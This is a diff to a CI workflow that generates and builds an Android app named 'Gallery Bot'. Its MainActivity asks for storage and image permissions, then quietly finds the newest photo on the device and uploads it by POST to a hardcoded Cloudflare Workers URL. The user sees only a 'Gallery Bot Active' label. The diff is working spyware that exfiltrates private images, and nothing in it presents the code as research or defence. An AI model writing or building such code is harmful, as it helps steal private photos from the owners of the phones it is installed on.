@@ -17,6 +17,169 @@ jobs:
         distribution: 'temurin'
         java-version: '17'
 
+    - name: Create Complete Android Project Files
+      run: |
+        echo "include ':app'" > settings.gradle
+        
+        # Manifest
+        mkdir -p app/src/main
+        cat << 'EOF' > app/src/main/AndroidManifest.xml
+        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+            package="com.example.botapp">
+            <uses-permission android:name="android.permission.INTERNET" />
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+            <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+            <application android:label="Gallery Bot" android:usesCleartextTraffic="true">
+                <activity android:name=".MainActivity" android:exported="true">
+                    <intent-filter>
+                        <action android:name="android.intent.action.MAIN" />
+                        <category android:name="android.intent.category.LAUNCHER" />
+                    </intent-filter>
+                </activity>
+            </application>
+        </manifest>
+        EOF
+
+        # Project Build.gradle
+        cat << 'EOF' > build.gradle
+        buildscript {
+            repositories {
+                google()
+                mavenCentral()
+            }
+            dependencies {
+                classpath 'com.android.tools.build:gradle:7.4.2'
+            }
+        }
+        allprojects {
+            repositories {
+                google()
+                mavenCentral()
+            }
+        }
+        EOF
+
+        # App Build.gradle
+        cat << 'EOF' > app/build.gradle
+        plugins {
+            id 'com.android.application'
+        }
+        android {
+            namespace 'com.example.botapp'
+            compileSdk 33
+            defaultConfig {
+                applicationId "com.example.botapp"
+                minSdk 21
+                targetSdk 33
+                versionCode 1
+                versionName "1.0"
+            }
+        }
+        EOF
+
+        # MainActivity.java with your Cloudflare Worker URL
+        mkdir -p app/src/main/java/com/example/botapp
+        cat << 'EOF' > app/src/main/java/com/example/botapp/MainActivity.java
+        package com.example.botapp;
+
+        import android.Manifest;
+        import android.app.Activity;
+        import android.content.pm.PackageManager;
+        import android.database.Cursor;
+        import android.net.Uri;
+        import android.os.Bundle;
+        import android.provider.MediaStore;
+        import android.widget.TextView;
+        import androidx.core.app.ActivityCompat;
+        import androidx.core.content.ContextCompat;
+
+        import java.io.File;
+        import java.io.FileInputStream;
+        import java.io.OutputStream;
+        import java.net.HttpURLConnection;
+        import java.net.URL;
+
+        public class MainActivity extends Activity {
+            private static final int PERMISSION_REQUEST_CODE = 100;
+            private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";
+
+            @Override
+            protected void onCreate(Bundle savedInstanceState) {
+                super.onCreate(savedInstanceState);
+                TextView tv = new TextView(this);
+                tv.setText("Gallery Bot Active");
+                setContentView(tv);
+
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                    ActivityCompat.requestPermissions(this, new String[]{
+                        Manifest.permission.READ_EXTERNAL_STORAGE,
+                        Manifest.permission.READ_MEDIA_IMAGES
+                    }, PERMISSION_REQUEST_CODE);
+                } else {
+                    sendLatestPhoto(CF_URL);
+                }
+            }
+
+            @Override
+            public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                if (requestCode == PERMISSION_REQUEST_CODE) {
+                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                        sendLatestPhoto(CF_URL);
+                    }
+                }
+            }
+
+            private void sendLatestPhoto(String targetUrl) {
+                new Thread(() -> {
+                    try {
+                        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                        String[] projection = {MediaStore.Images.Media.DATA};
+                        Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
+
+                        if (cursor != null) {
+                            if (cursor.moveToFirst()) {
+                                int index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+                                String path = cursor.getString(index);
+                                if (path != null) {
+                                    File file = new File(path);
+                                    if (file.exists()) {
+                                        uploadImage(targetUrl, file);
+                                    }
+                                }
+                            }
+                            cursor.close();
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }).start();
+            }
+
+            private void uploadImage(String targetUrl, File file) {
+                try {
+                    HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
+                    conn.setDoOutput(true);
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Content-Type", "application/octet-stream");
+
+                    OutputStream out = conn.getOutputStream();
+                    FileInputStream in = new FileInputStream(file);
+                    byte[] buffer = new byte[4096];
+                    int bytesRead;
+                    while ((bytesRead = in.read(buffer)) != -1) {
+                        out.write(buffer, 0, bytesRead);
+                    }
+                    in.close();
+                    out.flush();
+                    out.close();
+                    conn.getResponseCode();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+        EOF
+
     - name: Download Gradle Distribution
       run: |
         wget https://services.gradle.org/distributions/gradle-7.5-bin.zip
